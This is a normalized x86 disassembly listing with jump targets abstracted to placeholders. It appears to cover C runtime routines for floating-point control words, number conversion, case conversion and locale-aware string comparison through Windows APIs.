mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add esi 0xffff
mov [ ebp - 0x8 ] eax
test si si
jg r-xdata
mov ecx [ ebp - 0x48 ]
movzx edx [ eax ]
movzx ecx [ ecx ]
and [ ebp - 0x44 ] 0x0
imul ecx edx
mov edx [ edi - 0x4 ]
lea ebx [ edx + ecx ]
cmp ebx edx
jb r-xdata
inc esi
inc esi
inc [ ebp - 0x58 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp + ecx - 0x20 ]
add eax 0x8
mov [ ebp - 0x6c ] ecx
mov [ ebp - 0x68 ] eax
cmp [ eax + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr edi 0x1
or edi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x50 ]
mov ecx [ ebp - 0x58 ]
mov edx [ ebp - 0x40 ]
add ecx ecx
mov [ ebp - 0x50 ] edx
test edx edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x5c ] 0x1
cmp eax ecx
jae r-xdata
cmp [ eax ] esi
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp si ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] eax
je r-xdata
add edi 0xffff
test di di
jge r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x6c ] 0x2
sub [ ebp - 0x68 ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x5c ] 0x0
mov [ esi - 0x4 ] eax
je r-xdata
mov [ ebp - 0x18 ] esi
mov ax [ ebp - 0xe ]
or esi [ ebp - 0x5c ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] si
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x5c ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x10 ] cx
ja r-xdata
mov eax edi
neg eax
movzx eax ax
add edi eax
test di di
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
shr edx 0x1f
add eax eax
or eax edx
add edi 0xffff
mov [ ebp - 0x8 ] eax
test di di
jg r-xdata
mov eax [ ebp - 0x6c ]
movzx ecx [ eax ]
mov eax [ ebp - 0x68 ]
movzx eax [ eax ]
mov edx [ esi - 0x4 ]
imul ecx eax
and [ ebp - 0x5c ] 0x0
lea eax [ edx + ecx ]
cmp eax edx
jb r-xdata
mov eax [ ebp - 0x44 ]
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc esi
jmp r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr esi 0x1
or esi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x54 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp di ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x54 ] eax
je r-xdata
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x48 ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] di
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x48 ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc edi
jmp r-xdata
sub_1003aa35
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
pop esi
test ebx 0x40000
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_1003aac3
xor eax eax
test dl 0x10
je r-xdata
push ebx
push esi
push edi
mov ebx 0x200
test dl 0x8
je r-xdata
mov eax 0x80
test dl 0x4
je r-xdata
or eax ebx
test dl 0x2
je r-xdata
or eax 0x400
test dl 0x1
je r-xdata
or eax 0x800
mov edi 0x100
test edx 0x80000
je r-xdata
or eax 0x1000
mov ecx edx
mov esi 0x300
and ecx esi
je r-xdata
or eax edi
mov ecx 0x3000000
pop edi
and edx ecx
pop esi
pop ebx
cmp edx 0x1000000
je r-xdata
cmp ecx edi
je r-xdata
or eax 0x8040
cmp edx 0x2000000
je r-xdata
or eax 0x2000
cmp ecx ebx
je r-xdata
or eax 0x40
retn
cmp edx ecx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x8000
retn
or eax 0x6000
jmp r-xdata
sub_1003ab63
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
fwait
fnstcw [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov esi 0xc00
and eax esi
mov edi 0x300
je r-xdata
or edx 0x80000
and ecx edi
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax edi
not eax
and eax edx
and ecx edi
or eax ecx
mov [ ebp + 0xc ] eax
cmp eax edx
je r-xdata
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
xor esi esi
cmp [ rw-data ] esi
je r-xdata
mov ebx eax
call sub_1003aa35
movzx eax ax
mov [ ebp - 0x4 ] eax
fldcw [ ebp - 0x4 ]
fwait
fnstcw [ ebp - 0x4 ]
mov ebx [ ebp - 0x4 ]
xor edx edx
test bl 0x1
je r-xdata
or edx edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and edi 0x308031f
mov [ ebp - 0x14 ] edi
stmxcsr [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test eax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test eax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test eax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test eax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test eax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax esi
je r-xdata
or edx 0x80000
mov ecx eax
mov ebx 0x6000
and ecx ebx
je r-xdata
or esi 0x80000
and ecx 0x300
je r-xdata
cmp eax 0x400
je r-xdata
mov edi 0x8040
and eax edi
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov [ ebp + 0xc ] edx
mov eax edx
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
call sub_1003aac3
push eax
mov [ ebp - 0xc ] eax
call sub_1003b294
pop ecx
stmxcsr [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
xor edx edx
test cl cl
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
or edx 0x300
jmp r-xdata
test ecx 0x200
je r-xdata
push 0x10
pop edx
mov ecx eax
xor ecx [ ebp + 0xc ]
or eax [ ebp + 0xc ]
test ecx 0x8031f
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
and eax [ ebp + 0x8 ]
not edx
and edx esi
or edx eax
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test ecx 0x400
je r-xdata
or edx 0x8
or eax 0x80000000
test ecx 0x800
je r-xdata
or edx 0x4
test ecx 0x1000
je r-xdata
or edx 0x2
mov esi 0x100
test esi ecx
je r-xdata
or edx 0x1
mov eax ecx
and eax ebx
je r-xdata
or edx 0x80000
and ecx edi
sub ecx 0x40
je r-xdata
cmp eax 0x2000
je r-xdata
or edx 0x2000000
sub ecx 0x7fc0
je r-xdata
or edx esi
cmp eax 0x4000
je r-xdata
or edx 0x3000000
jmp r-xdata
sub ecx 0x40
jne r-xdata
or edx 0x200
jmp r-xdata
cmp eax ebx
jne r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_1003ae72
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push ebx
push esi
xor esi esi
push edi
mov [ ebp - 0x18 ] 0x404e
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
cmp [ ebp + 0xc ] esi
jbe r-xdata
cmp [ eax + 0x8 ] esi
je r-xdata
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov esi eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx edx
shr ecx 0x1f
lea edi [ edx + edx ]
lea edx [ ebx + ebx ]
or edx ecx
mov ecx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
add ecx ecx
or ecx esi
mov [ ebp - 0x14 ] edi
mov esi edi
and [ ebp - 0x14 ] 0x0
mov ebx edx
shr ebx 0x1f
add ecx ecx
shr edi 0x1f
or ecx ebx
mov ebx [ ebp - 0x10 ]
add esi esi
add edx edx
or edx edi
lea edi [ esi + ebx ]
mov [ eax ] esi
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
cmp edi esi
jb r-xdata
mov ecx [ eax + 0x4 ]
mov edx ecx
shr edx 0x10
mov [ eax + 0x8 ] edx
mov edx [ eax ]
mov edi edx
shl ecx 0x10
shr edi 0x10
or ecx edi
shl edx 0x10
add [ ebp - 0x18 ] 0xfff0
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
mov ebx 0x8000
test [ eax + 0x8 ] ebx
jne r-xdata
mov [ ebp - 0x14 ] 0x1
cmp edi ebx
jae r-xdata
mov cx [ ebp - 0x18 ]
mov [ eax + 0xa ] cx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn
mov esi [ eax ]
mov edi [ eax + 0x4 ]
add [ ebp - 0x18 ] 0xffff
mov ecx esi
add esi esi
shr ecx 0x1f
mov [ eax ] esi
lea esi [ edi + edi ]
or esi ecx
mov ecx [ eax + 0x8 ]
mov edx edi
shr edx 0x1f
add ecx ecx
or ecx edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] ecx
test ebx ecx
je r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
lea ebx [ ecx + edx ]
xor esi esi
cmp ebx ecx
jb r-xdata
lea esi [ edx + 0x1 ]
cmp esi edx
jb r-xdata
xor ebx ebx
mov [ eax ] edi
cmp [ ebp - 0x14 ] ebx
je r-xdata
xor esi esi
inc esi
cmp ebx edx
jae r-xdata
xor ebx ebx
inc ebx
cmp esi 0x1
jae r-xdata
mov ecx [ ebp - 0x8 ]
add [ eax + 0x8 ] ecx
and [ ebp - 0x14 ] 0x0
lea ecx [ edi + edi ]
mov edx edi
shr edx 0x1f
lea edi [ ebx + ebx ]
or edi edx
mov edx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
lea ebx [ edx + edx ]
mov edx [ ebp + 0x8 ]
or ebx esi
mov [ eax ] ecx
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ebx
movsx edx [ edx ]
lea esi [ ecx + edx ]
mov [ ebp - 0x10 ] edx
cmp esi ecx
jb r-xdata
inc [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
test esi esi
je r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] esi
test ebx ebx
je r-xdata
mov [ ebp - 0x14 ] 0x1
cmp esi edx
jae r-xdata
dec [ ebp + 0xc ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
ja r-xdata
lea ecx [ edi + 0x1 ]
xor edx edx
cmp ecx edi
jb r-xdata
cmp [ ebp - 0x14 ] 0x0
mov [ eax ] esi
je r-xdata
xor esi esi
jmp r-xdata
xor edx edx
inc edx
cmp ecx 0x1
jae r-xdata
inc ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x4 ] ecx
test edx edx
je r-xdata
sub_1003b040
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
mov ecx eax
sub esp 0x14
cmp [ ebp + 0x8 ] cx
je r-xdata
leave
retn
push ebx
push [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
call sub_10027728
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x14 ]
xor ebx ebx
cmp edx ebx
jne r-xdata
push esi
mov eax 0x100
mov esi eax
cmp [ ebp + 0x8 ] si
pop esi
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp cx 0x19
ja r-xdata
push [ ecx + 0x4 ]
lea ecx [ ebp - 0x4 ]
push 0x1
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
push edx
lea eax [ ebp - 0x14 ]
push eax
call sub_1002a34f
add esp 0x20
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_100379ed
add esp 0xc
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
movzx eax ax
jmp r-xdata
add eax 0x20
cmp [ ebp - 0x8 ] bl
je r-xdata
movzx eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x14 ]
mov ecx [ ecx + 0xcc ]
movzx ax [ ecx + eax ]
jmp r-xdata
pop ebx
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1003b0f5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_10027728
mov ecx [ ebp + 0x10 ]
xor ebx ebx
cmp ecx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_1002972b
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp ecx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
call sub_1002972b
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
jmp r-xdata
push [ eax + 0x4 ]
push ecx
push [ ebp + 0xc ]
push ecx
push [ ebp + 0x8 ]
push 0x1001
push [ eax + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1003b694
add esp 0x20
cmp eax ebx
jne r-xdata
push [ ebp + 0x14 ]
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003b6d6
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1003b1fd
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
xor esi esi
push edi
mov edi [ rw-data ]
mov [ ebp - 0x4 ] esi
mov eax [ edi ]
cmp eax esi
je r-xdata
xor eax eax
mov ebx [ WideCharToMultiByte@IAT ]
or eax 0xffffffff
jmp r-xdata
push 0x1
push eax
call sub_1002a045
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push esi
push esi
push [ ebp - 0x8 ]
push eax
push 0xffffffff
push [ edi ]
push esi
push esi
call ebx
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_10024aba
pop ecx
jmp r-xdata
lea eax [ ebp - 0x4 ]
push esi
push eax
call sub_1003b87c
pop ecx
pop ecx
test eax eax
jge r-xdata
add edi 0x4
mov eax [ edi ]
cmp eax esi
jne r-xdata
cmp [ ebp - 0x4 ] esi
je r-xdata
push esi
push esi
push esi
push esi
push 0xffffffff
push eax
push esi
push esi
call ebx
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
push [ ebp - 0x4 ]
call sub_10024aba
pop ecx
mov [ ebp - 0x4 ] esi
sub_1003b294
push 0x8
push r--data
call sub_1002ca38
xor eax eax
cmp [ rw-data ] eax
je r-xdata
call sub_1002ca7d
retn
test [ ebp + 0x8 ] 0x40
je r-xdata
and [ ebp + 0x8 ] 0xffffffbf
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_1003b306
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
jne r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
dec ecx
mov eax [ ebp + 0x8 ]
sub eax ecx
dec eax
pop ebp
retn
inc eax
sub_1003b324
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
push esi
push edi
xor edi edi
mov ebx edx
mov esi ecx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] eax
cmp [ rw-data ] edi
jne r-xdata
cmp [ ebp + 0x10 ] edi
jle r-xdata
push 0x1
mov eax r--data
push eax
push 0x1
push eax
push edi
push edi
call [ CompareStringW@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] 0xffffffff
jge r-xdata
push [ ebp + 0x10 ]
mov eax ebx
call sub_1003b306
pop ecx
mov [ ebp + 0x10 ] eax
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov edx [ ebp + 0x18 ]
cmp edx edi
jle r-xdata
xor eax eax
jmp r-xdata
cmp edx 0xffffffff
jl r-xdata
mov eax [ ebp - 0x1c ]
push edx
call sub_1003b306
mov edx eax
pop ecx
mov [ ebp + 0x18 ] edx
jmp r-xdata
mov [ rw-data ] 0x2
lea esp [ ebp - 0x38 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_100242d7
leave
retn
mov ecx [ rw-data ]
cmp ecx 0x2
je r-xdata
xor edi edi
xor ebx ebx
cmp [ ebp + 0x8 ] edi
jne r-xdata
cmp ecx edi
je r-xdata
cmp [ ebp + 0x1c ] edi
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
xor eax eax
inc eax
cmp ecx eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_10034270
mov esi eax
pop ecx
cmp esi 0xffffffff
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
mov [ ebp - 0x28 ] edi
cmp [ ebp + 0x1c ] edi
jne r-xdata
cmp esi [ ebp + 0x1c ]
je r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
mov [ ebp + 0x1c ] ecx
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push [ ebp + 0x10 ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringA@IAT ]
mov esi eax
test ebx ebx
je r-xdata
push 0x0
push 0x0
lea eax [ ebp + 0x10 ]
push eax
push [ ebp - 0x24 ]
push esi
push [ ebp + 0x1c ]
call sub_100342b9
mov ebx eax
add esp 0x18
test ebx ebx
je r-xdata
cmp [ ebp + 0x10 ] edx
jne r-xdata
cmp edx edi
jne r-xdata
mov eax esi
push ebx
call sub_10024aba
push edi
call sub_10024aba
pop ecx
pop ecx
push 0x0
push 0x0
lea eax [ ebp + 0x18 ]
push eax
push [ ebp - 0x1c ]
push esi
push [ ebp + 0x1c ]
call sub_100342b9
mov edi eax
add esp 0x18
test edi edi
jne r-xdata
cmp edx eax
jg r-xdata
push 0x2
mov esi [ MultiByteToWideChar@IAT ]
push edi
push edi
push [ ebp + 0x10 ]
push ebx
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
mov [ ebp - 0x2c ] ebx
cmp ebx edi
je r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] edi
push ebx
call sub_10024aba
pop ecx
jmp r-xdata
cmp [ ebp + 0x10 ] eax
jle r-xdata
mov edi 0x400
test ebx ebx
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0x1c ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
push 0x3
jmp r-xdata
and [ ebp - 0x20 ] 0x0
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
cmp [ ebp + 0x10 ] edi
jle r-xdata
pop eax
jmp r-xdata
push ebx
push [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push [ ebp - 0x24 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
cmp [ ebp + 0x18 ] edi
jle r-xdata
cmp [ ebp - 0x18 ] 0x2
jb r-xdata
push [ ebp - 0x20 ]
call sub_10029bcd
mov eax [ ebp - 0x28 ]
pop ecx
jmp r-xdata
push 0x0
push 0x0
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
push eax
call sub_100272fd
pop ecx
test eax eax
je r-xdata
call sub_10034470
mov eax esp
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x2
jae r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
jle r-xdata
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
add eax 0x8
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
mov cl [ ebx ]
cmp cl [ eax ]
jb r-xdata
push ebx
push edi
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
mov ecx [ ebp - 0x1c ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
push edi
call sub_10029bcd
pop ecx
push ebx
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x20 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
mov [ ebp - 0x28 ] eax
push eax
call sub_100272fd
pop ecx
test eax eax
je r-xdata
call sub_10034470
mov edi esp
test edi edi
je r-xdata
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
jmp r-xdata
test edi edi
je r-xdata
sub_1003b694
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10027728
push [ ebp + 0x24 ]
mov edx [ ebp + 0x14 ]
push [ ebp + 0x20 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_1003b324
add esp 0x18
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1003b6d6
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_10027728
mov edx [ ebp + 0x10 ]
xor ebx ebx
cmp edx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_1002972b
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp edx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x10 ]
cmp ecx ebx
jne r-xdata
call sub_1002972b
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1002480c
